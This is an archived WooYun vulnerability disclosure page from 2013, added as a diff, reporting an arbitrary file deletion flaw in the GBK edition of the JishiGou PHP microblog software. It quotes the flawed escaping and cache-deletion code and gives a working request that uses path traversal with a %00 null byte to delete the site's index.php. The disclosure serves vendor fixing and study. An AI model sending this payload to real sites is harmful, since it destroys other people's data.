@@ -1,0 +1,296 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		记事狗GBK版本任意文件删除漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		记事狗GBK版本任意文件删除漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-11-22 15:28</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-25：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-12：	细节向普通白帽子公开<br/>
+									2014-01-01：	细节向实习白帽子公开<br/>
+									2014-02-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">想了下还是提交算了，留着也没用。好久没搞黑盒了，恢复恢复求带啊。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题出在一个自定义函数上，官方好像出了4.5版本没去看是否也是用的这个函数，4.0大概找了下没找到可用包含的，要是4.5也有这个函数，新版本应该有包含漏洞，我就不去深究了，主要是指出问题，修正。<br />
+<br />
+include/function/global.func.php<br />
+<br />
+</p><pre><code>if(!function_exists(&#039;jaddslashes&#039;)) {<br />
+	function jaddslashes($string) {<br />
+		if(is_array($string)) {<br />
+			$keys = array_keys($string);<br />
+			foreach($keys as $key) {<br />
+				$val = $string[$key];<br />
+				unset($string[$key]);<br />
+				$string[jjaddslashes($key)] = jaddslashes($val);<br />
+			}<br />
+		} else {<br />
+			$string = jjaddslashes($string);<br />
+		}<br />
+		return $string;<br />
+	}<br />
+}<br />
+function jjaddslashes($str) {<br />
+			if(MAGIC_QUOTES_GPC) $str = stripslashes($str);//去掉转义<br />
+		if(&#039;gbk&#039;==$GLOBALS[&#039;_J&#039;][&#039;charset&#039;]) {<br />
+		$str = gbk_addslashes($str);//为GBK编码的时候，使用自定义的GBK函数。<br />
+	} else {<br />
+		$str = addslashes($str);<br />
+	}<br />
+	return $str;<br />
+}<br />
+function gbk_addslashes($text) {<br />
+	for ( ; ; ) {<br />
+		$i = mb_strpos($text, chr(92), 0, &quot;GBK&quot;);<br />
+		if ($i === false) break;<br />
+		$T = mb_substr($text, 0, $i, &quot;GBK&quot;) . chr(92) . chr(92);//将\添加一个\即\\，模仿GPC功能<br />
+		$text = substr($text, strlen($T) - 1);<br />
+		$OK .= $T;<br />
+	}<br />
+	$text = $OK . $text;<br />
+	$text = str_replace(chr(39), chr(92) . chr(39), $text);//将&#039;转义成\&#039;<br />
+	$text = str_replace(chr(34), chr(92) . chr(34), $text);//将&quot;转义成\&quot;<br />
+	return $text;<br />
+}</code></pre><p class='detail'><br />
+<br />
+但是上面的代码忘了GPC的另外一个重要功能，那就是%00的截断会被转义成\0,而上面并没有定义这个功能，所以导致了可截断。<br />
+<br />
+modules/ajax/misc.mod.php<br />
+<br />
+</p><pre><code>function refalshStatic(){<br />
+        $type = jget(&#039;type&#039;); //可控<br />
+        $cache_id = &#039;misc/&#039;.$type.&#039;_statistics&#039;;<br />
+        cache_file(&#039;rm&#039;,$cache_id); //跟进0x01<br />
+        if($type == &#039;other&#039;){<br />
+            cache_file(&#039;rm&#039;,&#039;misc/data_length&#039;);<br />
+        }<br />
+        $func = &#039;get&#039;.  ucfirst($type).&#039;Statistics&#039;;<br />
+        $ret = jlogic(&#039;other&#039;)-&gt;$func();<br />
+<br />
+        #生成html代码<br />
+        $head_html = &quot;&lt;tr class=&#039;altbg1&#039;&gt;&quot;;<br />
+        $body_html = &quot;&lt;tr class=&#039;altbg2&#039;&gt;&quot;;<br />
+        if($ret){<br />
+            foreach ($ret[&#039;data&#039;] as $k =&gt; $v) {<br />
+                $head_html .= &quot;&lt;td&gt;{$v[&#039;name&#039;]}&lt;/td&gt;&quot;;<br />
+                $body_html .= &quot;&lt;td&gt;{$v[&#039;num&#039;]}&lt;/td&gt;&quot;;<br />
+            }<br />
+        }<br />
+        $head_html .= &quot;&lt;/tr&gt;&quot;;<br />
+        $body_html .= &quot;&lt;/tr&gt;&quot;;<br />
+<br />
+        echo $head_html.$body_html;<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+include/function/global.func.php 0x01<br />
+<br />
+</p><pre><code>function cache_file($cmd, $key=&#039;&#039;, $val=&#039;&#039;, $life=0) {<br />
+	return jcache($cmd, $key, $val, $life, &#039;file&#039;);<br />
+}<br />
+function jcache($cmd, $key=&#039;&#039;, $val=&#039;&#039;, $life=0, $type=&#039;file&#039;) {<br />
+	$cmds = array(&#039;get&#039;=&gt;1, &#039;mget&#039;=&gt;1, &#039;set&#039;=&gt;1, &#039;mset&#039;=&gt;1, &#039;rm&#039;=&gt;1, &#039;mrm&#039;=&gt;1, &#039;del&#039;=&gt;1, &#039;clear&#039;=&gt;1, &#039;clean&#039;=&gt;1);<br />
+	if(isset($cmds[$cmd])) {<br />
+		$type = (&#039;db&#039; == $type ? &#039;db&#039; : &#039;file&#039;);<br />
+		switch ($cmd) {<br />
+			case &#039;get&#039;: return jmodel(&#039;cache/&#039; . $type)-&gt;get($key); break;<br />
+			case &#039;mget&#039;: return jmodel(&#039;cache/&#039; . $type)-&gt;get($key, 1); break;<br />
+			case &#039;set&#039;: return jmodel(&#039;cache/&#039; . $type)-&gt;set($key, $val, $life); break;<br />
+			case &#039;mset&#039;: return jmodel(&#039;cache/&#039; . $type)-&gt;set($key, $val, $life, 1); break;<br />
+			case &#039;rm&#039; : case &#039;del&#039;: return jmodel(&#039;cache/&#039; . $type)-&gt;rm($key, $val); break; //跟进0x02<br />
+			case &#039;mrm&#039; : return jmodel(&#039;cache/&#039; . $type)-&gt;rm($key, $val, 1); break;<br />
+			case &#039;clear&#039;: case &#039;clean&#039;: return jmodel(&#039;cache/&#039; . $type)-&gt;clear(); break;<br />
+		}<br />
+	}<br />
+	return null;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+include/class/cache/file.class.php<br />
+<br />
+</p><pre><code>function rm($key, $more=0) {<br />
+		return $this-&gt;del($key, $more);<br />
+	}<br />
+	function del($key, $more=0) {<br />
+		if($this-&gt;memory) {<br />
+			$this-&gt;memory-&gt;del($key, $this-&gt;prefix);<br />
+		} else {<br />
+			if($more &amp;&amp; is_dir(($dir = $this-&gt;path . $key))) {<br />
+				$ret = $this-&gt;io-&gt;ClearDir($dir);<br />
+			} else {<br />
+				$ret = $this-&gt;io-&gt;DeleteFile($this-&gt;_file($key)); //删除文件<br />
+			}<br />
+		}<br />
+		<br />
+		return $ret;<br />
+	}<br />
+	function _file($key) {<br />
+		return $this-&gt;path . $key . &#039;.cache.php&#039;; //因为后缀要加上.cache.php，所以只能删除缓存文件，但是我们截断的话就可以删除任意文件。<br />
+	}</code></pre><p class='detail'><br />
+<br />
+注册一个用户,提交localhost/jishigou/ajax.php?mod=misc&amp;code=refalshstatic&amp;type=../../../../index.php%00<br />
+<br />
+删除主页。<br />
+<br />
+会出现致命错误页面，因为在触发删除函数后，后面调用了OtherLogic类的方法，方法名是有type参数提供的，<br />
+<br />
+        $func = &#039;get&#039;.  ucfirst($type).&#039;Statistics&#039;;<br />
+<br />
+        $ret = jlogic(&#039;other&#039;)-&gt;$func();<br />
+<br />
+虽然可以截断函数调用这个类的其他函数，但是这个类里面没找到利用的。<br />
+<br />
+虽然是致命错误但是前面的删除已经触发了，所以无影响。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/22132102282933f09891e35d134bd3037d56c89a.png" target="_blank"><img src="../images/22132102282933f09891e35d134bd3037d56c89a.png" alt="1.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/2213211211c7710267160022ae1cde686e3489bb.png" target="_blank"><img src="../images/2213211211c7710267160022ae1cde686e3489bb.png" alt="2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">不包养了。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043705" title="记事狗GBK版本任意文件删除漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-11-22 16:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢 Chora@乌云 的反馈，正在抓紧修理。。。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43705";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
